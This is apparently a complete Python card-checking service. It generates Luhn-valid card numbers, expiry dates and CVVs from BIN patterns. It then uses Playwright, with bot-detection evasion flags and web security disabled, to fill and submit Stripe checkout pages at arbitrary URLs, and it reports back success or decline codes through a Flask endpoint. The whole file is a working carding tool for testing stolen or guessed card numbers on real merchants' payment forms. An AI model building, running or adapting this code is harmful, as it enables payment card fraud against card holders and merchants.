import os
import asyncio
import json
import random
import re
import time
from datetime import datetime
from playwright.async_api import async_playwright, Error as PlaywrightError
from flask import Flask, request, jsonify
from dotenv import load_dotenv
from collections import deque

# Load environment variables
load_dotenv()

# Configuration
CONFIG = {
    "RUN_LOCAL": os.getenv('RUN_LOCAL', 'false').lower() == 'true',
    "BROWSERLESS_API_KEY": os.getenv('BROWSERLESS_API_KEY'),
    "RESPONSE_TIMEOUT_SECONDS": 30,
    "RETRY_DELAY": 7000,  # milliseconds
    "RATE_LIMIT_REQUESTS": 5,
    "RATE_LIMIT_WINDOW": 60,
    "MAX_RETRIES": 3,
    "RETRY_BACKOFF": 5
}

app = Flask(__name__)

# Rate limiting storage
request_timestamps = deque(maxlen=CONFIG["RATE_LIMIT_REQUESTS"])

# === RATE LIMITING ===
def rate_limit_check():
    """Check if we're within rate limits"""
    now = time.time()
    while request_timestamps and request_timestamps[0] < now - CONFIG["RATE_LIMIT_WINDOW"]:
        request_timestamps.popleft()
    
    if len(request_timestamps) >= CONFIG["RATE_LIMIT_REQUESTS"]:
        oldest = request_timestamps[0]
        wait_time = CONFIG["RATE_LIMIT_WINDOW"] - (now - oldest)
        return False, wait_time
    
    request_timestamps.append(now)
    return True, 0

# === CARD GENERATION UTILITIES ===
def luhn_algorithm(number_str):
    total = 0
    reverse_digits = number_str[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if (i % 2) == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def complete_luhn(base):
    for d in range(10):
        candidate = base + str(d)
        if luhn_algorithm(candidate):
            return candidate
    return None

def get_card_length(bin_str):
    """Determine card length based on BIN"""
    first_two = bin_str[:2] if len(bin_str) >= 2 else ""
    first_four = bin_str[:4] if len(bin_str) >= 4 else ""
    
    if first_two in ['34', '37']:
        return 15
    if first_two == '36' or first_two == '38':
        return 14
    if first_four == '6011' or first_two == '65':
        return 16
    if (first_two >= '51' and first_two <= '55') or (first_four >= '2221' and first_four <= '2720'):
        return 16
    return 16

def get_cvv_length(card_number):
    return 4 if len(card_number) == 15 else 3

def random_digit():
    return str(random.randint(0, 9))

def generate_card_from_pattern(pattern):
    clean_pattern = re.sub(r'[^0-9x]', '', pattern, flags=re.IGNORECASE)
    card_length = get_card_length(clean_pattern.replace('x', '0'))
    
    result = ''
    for char in clean_pattern:
        if len(result) >= card_length - 1:
            break
        if char.lower() == 'x':
            result += random_digit()
        else:
            result += char
    
    while len(result) < card_length - 1:
        result += random_digit()
    
    result = result[:card_length - 1]
    return complete_luhn(result) or result + '0'

def process_card_with_placeholders(number, month, year, cvv):
    # Process number
    if 'x' in number.lower():
        processed_number = generate_card_from_pattern(number)
    else:
        processed_number = number
    
    # Process month
    if 'x' in month.lower():
        processed_month = str(random.randint(1, 12)).zfill(2)
    else:
        processed_month = month.zfill(2)
    
    # Process year
    current_year = datetime.now().year
    if 'x' in year.lower():
        processed_year = str(random.randint(current_year + 1, current_year + 6))
    elif len(year) == 2:
        processed_year = '20' + year
    else:
        processed_year = year
    
    # Process CVV
    cvv_length = get_cvv_length(processed_number)
    if 'x' in cvv.lower():
        processed_cvv = ''.join([random_digit() for _ in range(cvv_length)])
    else:
        processed_cvv = cvv
    
    return {
        "number": processed_number,
        "month": processed_month,
        "year": processed_year,
        "cvv": processed_cvv
    }

def process_card_input(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        return None
    
    number, month, year, cvv = parts
    return process_card_with_placeholders(number, month, year, cvv)

# === MAIN AUTOMATION FUNCTION ===
async def run_stripe_automation(url, cc_string, email=None):
    card = process_card_input(cc_string)
    if not card:
        return {"error": "Invalid card format. Use: number|month|year|cvv"}
    
    if not email:
        email = f"test{random.randint(1000,9999)}@example.com"
    
    print(f"\n{'='*60}")
    print(f"[INFO] Starting automation...")
    print(f"[CARD] {card['number']} | {card['month']}/{card['year']} | CVV: {card['cvv']}")
    print(f"[EMAIL] {email}")
    print('='*60)
    
    stripe_result = {"status": "pending", "raw_responses": []}
    
    async with async_playwright() as p:
        browser = None
        context = None
        page = None
        
        try:
            # Connect to browser using the suggested approach
            if CONFIG["RUN_LOCAL"]:
                print("[BROWSER] Launching local browser...")
                browser = await p.chromium.launch(
                    headless=False,
                    slow_mo=100,
                    args=[
                        '--disable-blink-features=AutomationControlled',
                        '--disable-features=IsolateOrigins,site-per-process',
                        '--disable-web-security'
                    ]
                )
            else:
                print("[BROWSER] Connecting to Browserless...")
                browser_url = f"wss://production-sfo.browserless.io/chromium/playwright?token={CONFIG['BROWSERLESS_API_KEY']}"
                try:
                    browser = await p.chromium.connect(browser_url, timeout=30000)
                    print("[BROWSER] Connected to Browserless successfully")
                except Exception as e:
                    if "429" in str(e):
                        print("[ERROR] Browserless rate limit hit. Falling back to local browser...")
                        browser = await p.chromium.launch(headless=True)
                    else:
                        raise e
            
            # Create context with proper settings
            context = await browser.new_context(
                viewport={'width': 1920, 'height': 1080},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                extra_http_headers={
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                }
            )
            
            page = await context.new_page()
            
            # Enhanced response capture with raw printing
            async def capture_response(response):
                try:
                    url_lower = response.url.lower()
                    
                    # Check for Stripe-related endpoints
                    stripe_endpoints = [
                        'payment_intents', 'tokens', 'sources', 'customers',
                        'setup_intents', 'payment_methods', 'confirm', 
                        'stripe.com/v1', 'stripe.network'
                    ]
                    
                    if any(endpoint in url_lower for endpoint in stripe_endpoints):
                        print(f"\n[RESPONSE CAPTURED] URL: {response.url}")
                        print(f"[STATUS] {response.status}")
                        
                        try:
                            # Try to get response body
                            body = await response.body()
                            text = body.decode('utf-8', errors='ignore')
                            
                            # Try to parse as JSON
                            try:
                                data = json.loads(text)
                                print(f"[RAW RESPONSE] {json.dumps(data, indent=2)}")
                                
                                # Store the response
                                stripe_result["raw_responses"].append({
                                    "url": response.url,
                                    "status": response.status,
                                    "data": data,
                                    "timestamp": datetime.now().isoformat()
                                })
                                
                                # Check for success/failure
                                if response.status >= 200 and response.status < 300:
                                    stripe_result["response"] = data
                                    stripe_result["status"] = "captured"
                                    
                                    # Check various success indicators
                                    if data.get('status') in ['succeeded', 'success', 'requires_capture']:
                                        stripe_result["success"] = True
                                        print("[SUCCESS] Payment successful!")
                                    elif data.get('payment_intent', {}).get('status') in ['succeeded', 'success']:
                                        stripe_result["success"] = True
                                        print("[SUCCESS] Payment successful!")
                                    elif data.get('error'):
                                        stripe_result["error_details"] = data.get('error')
                                        print(f"[ERROR] {data.get('error', {}).get('message', 'Unknown error')}")
                                
                                elif response.status >= 400:
                                    # Error response
                                    stripe_result["response"] = data
                                    stripe_result["status"] = "error"
                                    stripe_result["error_details"] = data.get('error', data)
                                    print(f"[ERROR RESPONSE] {json.dumps(data, indent=2)}")
                                    
                            except json.JSONDecodeError:
                                print(f"[RAW TEXT] {text[:500]}...")  # Print first 500 chars
                                
                        except Exception as e:
                            print(f"[ERROR READING RESPONSE] {e}")
                            
                except Exception as e:
                    print(f"[ERROR IN CAPTURE] {e}")
            
            # Set up response listener
            page.on("response", capture_response)
            
            # Also capture console messages
            page.on("console", lambda msg: print(f"[CONSOLE] {msg.text}"))
            
            # Navigate to the page
            print(f"\n[NAVIGATE] Loading: {url}")
            await page.goto(url, wait_until="domcontentloaded", timeout=60000)
            await page.wait_for_timeout(3000)
            
            # Take screenshot for debugging
            if CONFIG["RUN_LOCAL"]:
                screenshot = await page.screenshot()
                print(f"[SCREENSHOT] Taken! Size: {len(screenshot)} bytes")
            
            # Address/billing data
            address_data = {
                'name': 'Vclub Tech',
                'addressLine1': '123 Main Street',
                'addressLine2': 'OK',
                'city': 'Macao',
                'country': 'MO',
                'state': 'Macau',
                'postalCode': '999078'
            }
            
            # Get all frames
            frames = page.frames
            print(f"[INFO] Found {len(frames)} frames on page")
            
            # Try to fill forms in all frames
            filled_fields = {"email": False, "card": False, "expiry": False, "cvv": False, "postal": False}
            
            for frame_index, frame in enumerate(frames):
                print(f"\n[FRAME {frame_index}] Checking frame: {frame.url[:50]}...")
                
                # Email
                if not filled_fields["email"]:
                    email_selectors = [
                        'input[type="email"]',
                        'input[name="email"]',
                        'input[id*="email" i]',
                        'input[placeholder*="email" i]',
                        '#email'
                    ]
                    for selector in email_selectors:
                        try:
                            element = await frame.query_selector(selector)
                            if element and await element.is_visible():
                                await element.fill(email)
                                print(f"[FILLED] Email in frame {frame_index}")
                                filled_fields["email"] = True
                                break
                        except:
                            continue
                
                # Card number
                if not filled_fields["card"]:
                    card_selectors = [
                        'input[name="cardNumber"]',
                        'input[name="cardnumber"]',
                        'input[placeholder*="Card number" i]',
                        'input[placeholder*="1234 1234 1234 1234" i]',
                        'input[data-elements-stable-field-name="cardNumber"]',
                        '#Field-numberInput',
                        'input[autocomplete="cc-number"]'
                    ]
                    for selector in card_selectors:
                        try:
                            element = await frame.query_selector(selector)
                            if element and await element.is_visible():
                                await element.click()
                                await element.type(card['number'], delay=50)
                                print(f"[FILLED] Card number in frame {frame_index}")
                                filled_fields["card"] = True
                                break
                        except:
                            continue
                
                # Expiry
                if not filled_fields["expiry"]:
                    expiry_selectors = [
                        'input[name="cardExpiry"]',
                        'input[placeholder*="MM / YY" i]',
                        'input[placeholder*="MM/YY" i]',
                        'input[data-elements-stable-field-name="cardExpiry"]',
                        '#Field-expiryInput',
                        'input[autocomplete="cc-exp"]'
                    ]
                    for selector in expiry_selectors:
                        try:
                            element = await frame.query_selector(selector)
                            if element and await element.is_visible():
                                await element.click()
                                await element.type(f"{card['month']}/{card['year'][-2:]}", delay=50)
                                print(f"[FILLED] Expiry in frame {frame_index}")
                                filled_fields["expiry"] = True
                                break
                        except:
                            continue
                
                # CVV
                if not filled_fields["cvv"]:
                    cvc_selectors = [
                        'input[name="cardCvc"]',
                        'input[name="cvc"]',
                        'input[placeholder*="CVC" i]',
                        'input[placeholder*="CVV" i]',
                        'input[data-elements-stable-field-name="cardCvc"]',
                        '#Field-cvcInput',
                        'input[autocomplete="cc-csc"]'
                    ]
                    for selector in cvc_selectors:
                        try:
                            element = await frame.query_selector(selector)
                            if element and await element.is_visible():
                                await element.click()
                                await element.type(card['cvv'], delay=50)
                                print(f"[FILLED] CVV in frame {frame_index}")
                                filled_fields["cvv"] = True
                                break
                        except:
                            continue
                
                # Postal code
                if not filled_fields["postal"]:
                    postal_selectors = [
                        'input[name="postalCode"]',
                        'input[name="postal"]',
                        'input[placeholder*="ZIP" i]',
                        'input[placeholder*="Postal" i]',
                        '#Field-postalCodeInput',
                        'input[autocomplete="postal-code"]'
                    ]
                    for selector in postal_selectors:
                        try:
                            element = await frame.query_selector(selector)
                            if element and await element.is_visible():
                                await element.fill(address_data['postalCode'])
                                print(f"[FILLED] Postal code in frame {frame_index}")
                                filled_fields["postal"] = True
                                break
                        except:
                            continue
            
            # Print summary of filled fields
            print(f"\n[FORM STATUS] {filled_fields}")
            
            # Wait a bit after filling
            await page.wait_for_timeout(2000)
            
            # Try to submit the form
            submit_selectors = [
                '.SubmitButton',
                'button[type="submit"]',
                'button:has-text("Pay")',
                'button:has-text("Submit")',
                'button:has-text("Complete")',
                'button.Button--primary',
                'button[data-testid="hosted-payment-submit-button"]'
            ]
            
            submit_clicked = False
            for selector in submit_selectors:
                try:
                    # Try in main page
                    button = page.locator(selector).first
                    if await button.is_visible(timeout=1000):
                        await button.click()
                        print(f"[CLICKED] Submit button with selector: {selector}")
                        submit_clicked = True
                        break
                except:
                    # Try in frames
                    for frame in frames:
                        try:
                            button = await frame.query_selector(selector)
                            if button and await button.is_visible():
                                await button.click()
                                print(f"[CLICKED] Submit button in frame with selector: {selector}")
                                submit_clicked = True
                                break
                        except:
                            continue
                    if submit_clicked:
                        break
            
            if not submit_clicked:
                print("[WARNING] Could not find submit button")
            
            # Wait for response with timeout
            print("\n[WAITING] Waiting for Stripe API response...")
            start_time = time.time()
            
            while time.time() - start_time < CONFIG["RESPONSE_TIMEOUT_SECONDS"]:
                if stripe_result["status"] in ["captured", "error"]:
                    break
                
                # Check for 3DS or other redirects
                current_url = page.url
                if "3d" in current_url.lower() or "authenticate" in current_url.lower():
                    print("[INFO] 3D Secure authentication detected")
                    stripe_result["requires_3ds"] = True
                    # Wait for 3DS to complete
                    await page.wait_for_timeout(5000)
                
                await asyncio.sleep(0.5)
            
            # Prepare final result
            if stripe_result.get("success"):
                return {
                    "success": True,
                    "message": "Payment successful",
                    "data": stripe_result.get("response"),
                    "raw_responses": stripe_result.get("raw_responses", [])
                }
            elif stripe_result.get("error_details"):
                error = stripe_result.get("error_details", {})
                return {
                    "success": False,
                    "error": error.get("message", "Payment declined"),
                    "code": error.get("code", "unknown"),
                    "decline_code": error.get("decline_code"),
                    "data": stripe_result.get("response"),
                    "raw_responses": stripe_result.get("raw_responses", [])
                }
            elif stripe_result.get("raw_responses"):
                # We got some responses but couldn't determine success/failure
                return {
                    "success": False,
                    "message": "Payment result unclear",
                    "raw_responses": stripe_result.get("raw_responses", [])
                }
            else:
                return {
                    "error": "Timeout waiting for Stripe response",
                    "details": "No response captured from Stripe API",
                    "filled_fields": filled_fields
                }
                
        except Exception as e:
            print(f"\n[EXCEPTION] {str(e)}")
            return {
                "error": "Automation failed",
                "details": str(e),
                "raw_responses": stripe_result.get("raw_responses", [])
            }
            
        finally:
            # Clean up properly
            if page:
                try:
                    await page.close()
                    print("[CLEANUP] Page closed")
                except:
                    pass
            if context:
                try:
                    await context.close()
                    print("[CLEANUP] Context closed")
                except:
                    pass
            if browser:
                try:
                    await browser.close()
                    print("[CLEANUP] Browser closed")
                except:
                    pass

# === API ENDPOINT ===
@app.route('/hrkXstripe', methods=['GET'])
def stripe_endpoint():
    # Check rate limit
    can_proceed, wait_time = rate_limit_check()
    if not can_proceed:
        return jsonify({
            "error": "Rate limit exceeded",
            "retry_after": f"{wait_time:.1f} seconds",
            "message": f"Maximum {CONFIG['RATE_LIMIT_REQUESTS']} requests per {CONFIG['RATE_LIMIT_WINDOW']} seconds"
        }), 429
    
    url = request.args.get('url')
    cc = request.args.get('cc')
    email = request.args.get('email')
    
    print(f"\n{'='*60}")
    print(f"NEW REQUEST: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"URL: {url}")
    print(f"CC: {cc}")
    print(f"Email: {email}")
    print('='*60)
    
    if not url or not cc:
        return jsonify({"error": "Missing required parameters: url and cc"}), 400
    
    # Run async function
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        result = loop.run_until_complete(run_stripe_automation(url, cc, email))
        
        print("\n" + "="*60)
        print("FINAL RESULT:")
        print(json.dumps(result, indent=2))
        print("="*60 + "\n")
        
        if result.get('success'):
            return jsonify(result), 200
        elif 'error' in result:
            return jsonify(result), 400
        else:
            return jsonify(result), 200
        
    except Exception as e:
        print(f"[SERVER ERROR] {str(e)}")
        return jsonify({"error": "Server error", "details": str(e)}), 500
    finally:
        loop.close()

# === STATUS ENDPOINT ===
@app.route('/status', methods=['GET'])
def status_endpoint():
    return jsonify({
        "status": "online",
        "rate_limit": {
            "requests_made": len(request_timestamps),
            "requests_remaining": CONFIG["RATE_LIMIT_REQUESTS"] - len(request_timestamps),
            "window_seconds": CONFIG["RATE_LIMIT_WINDOW"]
        },
        "config": {
            "run_local": CONFIG["RUN_LOCAL"],
            "has_api_key": bool(CONFIG["BROWSERLESS_API_KEY"])
        },
        "timestamp": datetime.now().isoformat()
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5001))
    print(f"Starting server on port {port}...")
    app.run(host='0.0.0.0', port=port, debug=True)
